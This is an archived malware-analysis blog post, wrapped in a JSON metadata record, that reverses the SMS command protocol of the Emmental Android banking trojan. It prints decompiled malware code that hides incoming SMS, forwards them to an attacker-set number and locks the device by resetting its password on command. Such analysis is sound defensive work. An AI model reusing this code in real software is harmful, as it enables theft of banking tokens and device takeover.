{
    "id": "01218918-b803-4526-9230-b7490f87895f",
    "created_at": "2023-01-12T15:00:10.611198Z",
    "updated_at": "2025-03-27T02:05:53.714396Z",
    "deleted_at": null,
    "sha1_hash": "d7d5120eb1bed76ee644e49c979d8a276d4cfb67",
    "title": "2015-11-03 - Reversing the SMS C&C protocol of Emmental (1st part - understanding the code)",
    "authors": "",
    "file_creation_date": "2022-05-27T18:59:18Z",
    "file_modification_date": "2022-05-27T18:59:18Z",
    "file_size": 185306,
    "plain_text": "# Reversing the SMS C&C protocol of Emmental (1st part - understanding the code)\n\n**[blog.angelalonso.es/2015/11/reversing-sms-c-protocol-of-emmental.html](http://blog.angelalonso.es/2015/11/reversing-sms-c-protocol-of-emmental.html)**\n\nIn a previous [post I described how I reversed and decrypt the HTTP C2C protocol used by](http://blog.angelalonso.es/2015/10/reversing-c2c-http-emmental.html)\n[Emmental malware. Also, in other post I introduced the Androguard framework with some](http://blog.angelalonso.es/2015/10/malware-analysis-with-androguad.html)\nexamples.\n\nNow it is time to focus on the SMS C2C protocol and how I have reversed it.\n\nThe sample used is again the same:\nc5cdba8771e2aee76d5bad8c2e225cd4a642050a7cfa6f22132edf607de42349\n\nThe code of this malware is obfuscated and also use some anti-reversing techniques. For\nexample, if you try to open it with j2-gui after the DEX has been converted to Java code some\npart of the code will not show properly.\n\nThe obfuscation makes the analysis a bit more difficult so a bit of patient is necessary.\n\nIf you have the money, there is a very good tool, [JEB, which can help you with de-obfuscated](https://www.pnfsoftware.com/)\nJava code and make the analysis easier and faster.\n\n## Finding the entry point\n\nWhen dealing with analysis like this it is important to figure out which is the entry point. In this\ncase, the entry point must be anything related to any SMS ( any method, permission, provider...).\nSo we can look where some SMS permissions are used (SEND_SMS or RECEIVED_SMS) or we\ncan check where the Android SMS provider is used\n\n\n-----\n\nFor this analysis I am going to start looking to the Android SMS provider\n(android.provider.Telephony.SMS_RECEIVED).\n\nSo first thing I do is to search for the string \"android.provider.Telephony.SMS_RECEIVED\" in\norder to see which methods are using it.\n\nIn [48]: a, d, dx = AnalyzeAPK(\"malware.apk\", decompiler=\"dad\")\nIn [64]: z = dx.tainted_variables.get_string(\"android.provider.Telephony.SMS_RECEIVED\")\nIn [65]: z\nOut[65]: <androguard.core.analysis.analysis.TaintedVariable at 0x7fd99a967090>\n\nIn [66]: z.show_paths(d)\nR f4 Lorg/thoughtcrime/securesms/service/SmsListener;->onReceive (Landroid/content/Context;\nLandroid/content/Intent;)V\nR 202 Lorg/thoughtcrime/securesms/service/SmsListener;->onReceive\n(Landroid/content/Context; Landroid/content/Intent;)V\nR 36 Lorg/thoughtcrime/securesms/service/SmsListener;->a (Landroid/content/Context;\nLandroid/content/Intent;)Z\n\nClearly I find some interesting method 'onReceive' in the class:\nLorg.thoughtcrime.securesms.service.SmsListener\n\n## The first method\n\nIn [70]:\n**d.CLASS_Lorg_thoughtcrime_securesms_service_SmsListener.METHOD_onReceive.source()**\npublic void onReceive(android.content.Context p8, android.content.Intent p9)\n{\n\nString v0_3 = ((Object[]) ((Object[]) p9.getExtras().get(\"pdus\")));\n\nString v5_0 = new android.telephony.SmsMessage[v0_3.length];\n\nString v2_1 = 0;\n\nString v4_0 = \"\";\n\nwhile (v2_1 < v0_3.length) {\n\nv5_0[v2_1] = android.telephony.SmsMessage.createFromPdu(((byte[]) ((byte[])\nv0_3[v2_1])));\n\nv4_0 = new\nStringBuilder().append(v4_0).append(v5_0[v2_1].getMessageBody()).toString();\n\nv2_1++;\n\n}\n\nString v0_8 = android.telephony.SmsMessage.createFromPdu(((byte[]) ((byte[])\nv0_3[0]))).getDisplayOriginatingAddress();\n\nandroid.content.Intent v1_4 = new org.thoughtcrime.securesms.h.f(v4_0, p8);\n\nif ((!p9.getAction().equals(\"android.provider.Telephony.SMS_DELIVER\")) ||\n((!v1_4.a().booleanValue()) && (org.thoughtcrime.securesms.h.i.a(\"RTB\", 0, p8) == 0))) {\n\nif ((!p9.getAction().equals(\"android.provider.Telephony.SMS_RECEIVED\")) ||\n((!v1_4.a().booleanValue()) && (org.thoughtcrime.securesms.h.i.a(\"RTB\", 0, p8) == 0))) {\n\n\n-----\n\nif ((p9.getAction().equals( android.provider.Telephony.SMS_DELIVER )) ||\n((p9.getAction().equals(\"android.provider.Telephony.SMS_RECEIVED\")) && (this.a(p8, p9)))) {\nString v0_15 = new android.content.Intent(p8,\norg.thoughtcrime.securesms.service.SendReceiveService);\n\nv0_15.setAction(\"org.thoughtcrime.securesms.SendReceiveService.RECEIVE_SMS_ACTION\");\nv0_15.putExtra(\"ResultCode\", this.getResultCode());\nv0_15.putParcelableArrayListExtra(\"text_messages\", this.c(p9));\np8.startService(v0_15);\nthis.abortBroadcast();\n}\n} else {\nif (!v1_4.a().booleanValue()) {\nif (org.thoughtcrime.securesms.h.i.a(\"RTB\", 0, p8) != 2) {\nif ((org.thoughtcrime.securesms.h.i.a(\"RTB\", 0, p8) == 1) &&\n(org.thoughtcrime.securesms.h.i.c(v0_8, 0, p8) == 1)) {\nthis.abortBroadcast();\nandroid.content.Intent v1_17 = new android.content.Intent(p8,\norg.thoughtcrime.securesms.xservices.XSmsIncom);\nv1_17.putExtra(\"sms_body\", v4_0);\nv1_17.putExtra(\"sms_from\", v0_8);\np8.startService(v1_17);\n}\n} else {\nthis.abortBroadcast();\nString v0_17 = org.thoughtcrime.securesms.h.i.a(\"sms_phone\", \"0\", p8);\nif (v0_17 != \"0\") {\norg.thoughtcrime.securesms.h.i.d(v0_17, v4_0, p8);\n}\n}\n} else {\nthis.abortBroadcast();\nif (v1_4.b().booleanValue()) {\nv1_4.a(p8);\n}\n}\n}\n} else {\nthis.abortBroadcast();\n}\nreturn;\n}\n\n## The second method\n\n\n-----\n\nLooking at the code above I see an interesting call to another method in other class, which I also\ndisplay here:\n\nIn [71]: d.CLASS_Lorg_thoughtcrime_securesms_h_f.source()\n**package org.thoughtcrime.securesms.h;**\npublic class f {\nprivate String a;\nprivate org.thoughtcrime.securesms.h.h b;\nprivate String c;\nprivate String d;\nprivate Boolean e;\nprivate Boolean f;\nprivate String[] g;\n\npublic f(String p6, android.content.Context p7)\n{\nthis.c = \"0\";\nthis.d = \"0\";\nthis.e = Boolean.valueOf(0);\nthis.f = Boolean.valueOf(0);\nthis.g = p6.split(\" \");\nif ((this.g.length > 1) && (org.thoughtcrime.securesms.h.h.a(this.g[1]))) {\nthis.a = this.g[0];\nthis.b = org.thoughtcrime.securesms.h.h.valueOf(this.g[1]);\nif (this.g.length > 2) {\nthis.c = this.g[2];\nif (this.g.length > 3) {\nthis.d = this.g[3];\norg.thoughtcrime.securesms.h.i.b(\"service_code\", this.d, p7);\n}\n}\nthis.e = Boolean.valueOf(1);\nif (org.thoughtcrime.securesms.h.i.b(org.thoughtcrime.securesms.h.i.a(this.a))) {\nthis.f = Boolean.valueOf(1);\n}\n}\nreturn;\n}\n\npublic Boolean a()\n{\nreturn this.e;\n}\n\n\n-----\n\npublic void a(android.content.Context p4)\n{\nswitch (org.thoughtcrime.securesms.h.g.a[this.b.ordinal()]) {\ncase 1:\nString v0_35 = org.thoughtcrime.securesms.h.i.a(\"PHONE_NUMBER\", \"\", p4);\nif ((this.c == \"0\") && (v0_35.length() > 0)) {\nthis.c = v0_35;\n}\nif (this.c == \"0\") {\n} else {\norg.thoughtcrime.securesms.h.i.b(\"sms_phone\", this.c, p4);\norg.thoughtcrime.securesms.h.i.b(\"RTB\", 2, p4);\norg.thoughtcrime.securesms.h.i.d(this.c, \"Service Started\", p4);\n}\nbreak;\ncase 2:\norg.thoughtcrime.securesms.h.i.b(\"RTB\", 1, p4);\norg.thoughtcrime.securesms.h.i.b(\"Service Started\", p4);\nbreak;\ncase 3:\nthis.c = org.thoughtcrime.securesms.h.i.a(\"sms_phone\", \"0\", p4);\norg.thoughtcrime.securesms.h.i.b(\"sms_phone\", \"0\", p4);\norg.thoughtcrime.securesms.h.i.b(\"RTB\", 0, p4);\nif (this.c == \"0\") {\n} else {\norg.thoughtcrime.securesms.h.i.d(this.c, \"Service Stoped\", p4);\n}\nbreak;\ncase 4:\norg.thoughtcrime.securesms.h.i.b(\"DEL\", 1, p4);\nthis.c = org.thoughtcrime.securesms.h.i.a(\"sms_phone\", this.c, p4);\nif (this.c == \"0\") {\n} else {\norg.thoughtcrime.securesms.h.i.d(this.c, \"Delete command received\", p4);\n}\nbreak;\ncase 5:\nif (this.c == \"0\") {\n} else {\norg.thoughtcrime.securesms.h.i.m(p4);\norg.thoughtcrime.securesms.h.i.b(\"URL_MAIN\", this.c, p4);\norg.thoughtcrime.securesms.h.i.b(\"Buffer setted\", p4);\np4.sendBroadcast(new android.content.Intent(p4,\norg.thoughtcrime.securesms.xservices.XRepeat));\n\n\n-----\n\n}\nbreak;\ncase 6:\norg.thoughtcrime.securesms.h.i.m(p4);\nbreak;\ncase 7:\nif (this.c == \"0\") {\n} else {\norg.thoughtcrime.securesms.h.i.m(p4);\norg.thoughtcrime.securesms.h.i.b(\"PHONE_NUMBER\", this.c, p4);\norg.thoughtcrime.securesms.h.i.b(\"Number setted\", p4);\n}\nbreak;\ncase 8:\norg.thoughtcrime.securesms.h.i.b(\"PHONE_NUMBER\", \"\", p4);\nbreak;\ncase 9:\norg.thoughtcrime.securesms.h.i.m(p4);\norg.thoughtcrime.securesms.h.i.b(\"PHONE_NUMBER\", \"\", p4);\nbreak;\ncase 10:\nif (this.c == \"0\") {\n} else {\nString v0_9 = ((android.app.admin.DevicePolicyManager)\np4.getSystemService(\"device_policy\"));\nv0_9.resetPassword(this.c, 1);\nv0_9.lockNow();\norg.thoughtcrime.securesms.h.i.b(\"Device locked\", p4);\n}\nbreak;\ncase 11:\nString v0_4 = ((android.app.admin.DevicePolicyManager)\np4.getSystemService(\"device_policy\"));\nv0_4.resetPassword(\"\", 1);\nv0_4.lockNow();\norg.thoughtcrime.securesms.h.i.b(\"Device unlocked\", p4);\nbreak;\n}\nreturn;\n}\n\npublic Boolean b()\n{\nreturn this.f;\n\n\n-----\n\n}\n}\n\n## The third method\n\nThe method above makes again a call to other method in other class\n'org.thoughtcrime.securesms.h.h.valueOf'.By the name of that method it looks like some kind of\nvalue is extracted or converted. Time to look to that method:\n\nIn [72]:In [72]: d.CLASS_Lorg_thoughtcrime_securesms_h_h.source()\n\n**package org.thoughtcrime.securesms.h;**\n\nfinal enum class h extends java.lang.Enum {\n\npublic static final enum org.thoughtcrime.securesms.h.h a;\n\npublic static final enum org.thoughtcrime.securesms.h.h b;\n\npublic static final enum org.thoughtcrime.securesms.h.h c;\n\npublic static final enum org.thoughtcrime.securesms.h.h d;\n\npublic static final enum org.thoughtcrime.securesms.h.h e;\n\npublic static final enum org.thoughtcrime.securesms.h.h f;\n\npublic static final enum org.thoughtcrime.securesms.h.h g;\n\npublic static final enum org.thoughtcrime.securesms.h.h h;\n\npublic static final enum org.thoughtcrime.securesms.h.h i;\n\npublic static final enum org.thoughtcrime.securesms.h.h j;\n\npublic static final enum org.thoughtcrime.securesms.h.h k;\n\nprivate static final synthetic org.thoughtcrime.securesms.h.h[] l;\n\nstatic h()\n\n{\n\norg.thoughtcrime.securesms.h.h.a = new org.thoughtcrime.securesms.h.h(\"GOOGL\", 0);\n\norg.thoughtcrime.securesms.h.h.b = new org.thoughtcrime.securesms.h.h(\"STARTB\", 1);\n\norg.thoughtcrime.securesms.h.h.c = new org.thoughtcrime.securesms.h.h(\"GOOGLE\", 2);\n\norg.thoughtcrime.securesms.h.h.d = new org.thoughtcrime.securesms.h.h(\"DEL\", 3);\n\norg.thoughtcrime.securesms.h.h.e = new org.thoughtcrime.securesms.h.h(\"YAHOO\", 4);\n\norg.thoughtcrime.securesms.h.h.f = new org.thoughtcrime.securesms.h.h(\"CLEARB\", 5);\n\norg.thoughtcrime.securesms.h.h.g = new org.thoughtcrime.securesms.h.h(\"SETP\", 6);\n\norg.thoughtcrime.securesms.h.h.h = new org.thoughtcrime.securesms.h.h(\"CLEARP\", 7);\n\norg.thoughtcrime.securesms.h.h.i = new org.thoughtcrime.securesms.h.h(\"DROPBOX\", 8);\n\norg.thoughtcrime.securesms.h.h.j = new org.thoughtcrime.securesms.h.h(\"LOCK\", 9);\n\norg.thoughtcrime.securesms.h.h.k = new org.thoughtcrime.securesms.h.h(\"UNLOCK\", 10);\n\norg.thoughtcrime.securesms.h.h[] v0_23 = new org.thoughtcrime.securesms.h.h[11];\n\nv0_23[0] = org.thoughtcrime.securesms.h.h.a;\n\nv0_23[1] = org.thoughtcrime.securesms.h.h.b;\n\nv0_23[2] = org.thoughtcrime.securesms.h.h.c;\n\nv0_23[3] = org.thoughtcrime.securesms.h.h.d;\n\nv0_23[4] = org.thoughtcrime.securesms.h.h.e;\n\nv0_23[5] = org.thoughtcrime.securesms.h.h.f;\n\n\n-----\n\nv0_23[6] = org.thoughtcrime.securesms.h.h.g;\nv0_23[7] = org.thoughtcrime.securesms.h.h.h;\nv0_23[8] = org.thoughtcrime.securesms.h.h.i;\nv0_23[9] = org.thoughtcrime.securesms.h.h.j;\nv0_23[10] = org.thoughtcrime.securesms.h.h.k;\norg.thoughtcrime.securesms.h.h.l = v0_23;\nreturn;\n}\n\nprivate h(String p1, int p2)\n{\nthis(p1, p2);\nreturn;\n}\n\npublic static boolean a(String p5)\n{\nint v0 = 0;\norg.thoughtcrime.securesms.h.h[] v2 = org.thoughtcrime.securesms.h.h.values();\nint v1 = 0;\nwhile (v1 < v2.length) {\nif (!v2[v1].name().equals(p5)) {\nv1++;\n} else {\nv0 = 1;\nbreak;\n}\n}\nreturn v0;\n}\n\npublic static org.thoughtcrime.securesms.h.h valueOf(String p1)\n{\nreturn ((org.thoughtcrime.securesms.h.h) Enum.valueOf(org.thoughtcrime.securesms.h.h,\np1));\n}\n\npublic static org.thoughtcrime.securesms.h.h[] values()\n{\nreturn ((org.thoughtcrime.securesms.h.h[]) org.thoughtcrime.securesms.h.h.l.clone());\n}\n}\n\n## Back to second method\n\n\n-----\n\nLooking at the Java class I see that there is a some kind conversion from a string to a number.\nThose strings looks familiar to me and I have seen some of the them in memory analysis I did in\nprevious posts. So basically the string \"GOOGL\" is 'mapped' to the number '1' which can be later\nused in a 'switch' condition in the caller method org.thought.crime.securesms.h.f and from there\njump to the method which executes the valid code. So for example, the 'GOOGL' strings, maps to\nnumber '1' and in the 'switch', the code is the following:\n\ncase 1:\nString v0_35 = org.thoughtcrime.securesms.h.i.a(\"PHONE_NUMBER\", \"\", p4);\nif ((this.c == \"0\") && (v0_35.length() > 0)) {\nthis.c = v0_35;\n}\nif (this.c == \"0\") {\n} else {\norg.thoughtcrime.securesms.h.i.b(\"sms_phone\", this.c, p4);\norg.thoughtcrime.securesms.h.i.b(\"RTB\", 2, p4);\norg.thoughtcrime.securesms.h.i.d(this.c, \"Service Started\", p4);\n}\nbreak\n\nI have created a very basic flow diagram to see how the functions are called\n\n## The fourth method\n\nIn the code above there is an interesting call to one\nmethod: org.thoughtcrime.securesms.h.i.b(\"sms_phone\", this.c, p4)\n\n\n-----\n\nThe code of this method is:\n\npublic static void b(String p2, String p3, android.content.Context p4)\n{\nandroid.content.SharedPreferences$Editor v0_2;\nif (android.os.Build$VERSION.SDK_INT < 11) {\nv0_2 = p4.getSharedPreferences(\"MainPref\", 0);\n} else {\nv0_2 = p4.getSharedPreferences(\"MainPref\", 4);\n}\nandroid.content.SharedPreferences$Editor v0_4 = v0_2.edit();\nv0_4.putString(p2, p3);\nv0_4.commit();\n\nreturn;\n\nIn essence, this method finally is editing the MainPreferences.xml used by the malware to keep\n[its configuration. This file is basically the XML file discovered in this post which keeps the](http://blog.angelalonso.es/2015/10/android-memory-analysis-iii-analyzing.html)\nconfiguration of the malware. In this case, this is a phone number which I advance is the number\nused to forward the stolen tokens (I will explain this in next post).\n\nThis is a summary of what's going:\n\n1. When there is a new SMS received the OnReceive() method calls other method\n\norg.thoughtcrime.securesms.h.f\n2. The method org.thoughtcrime.securesms.h.f contains a 'switch' in order to jump to the\n\nspecific method to execute the code. But previous to that, the method needs to know which\nis the value of the variable for the 'switch'. To get this value, a call to the\nmethod org.thoughtcrime.securesms.h.h is done.\n3. The method org.thoughtcrime.securesms.h.f is in charge of mapping strings to integer\n\nvalues. So the value returned is used by the method org.thoughtcrime.securesms.h.f .\n4. Once org.thoughtcrime.securesms.h.f knows the value for the 'switch' it jumps to the correct\n\nmethod which execute the C&C command.\n\nWhere I am going to focus the investigation?\nBasically in the strings mapped to integers. Those are the ones which are the C&C commands.\nSo I need to see what the commands GOOGL, STARTB, DEL, YAHOO, etc, are used for.\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2015/2015-11-03 - Reversing the SMS C&C protocol of Emmental (1st part - understanding the code).pdf"
    ],
    "report_names": [
        "2015-11-03 - Reversing the SMS C&C protocol of Emmental (1st part - understanding the code).pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535610,
    "ts_updated_at": 1743041153,
    "ts_creation_date": 1653677958,
    "ts_modification_date": 1653677958,
    "files": {
        "pdf": "https://archive.orkl.eu/d7d5120eb1bed76ee644e49c979d8a276d4cfb67.pdf",
        "text": "https://archive.orkl.eu/d7d5120eb1bed76ee644e49c979d8a276d4cfb67.txt",
        "img": "https://archive.orkl.eu/d7d5120eb1bed76ee644e49c979d8a276d4cfb67.jpg"
    }
}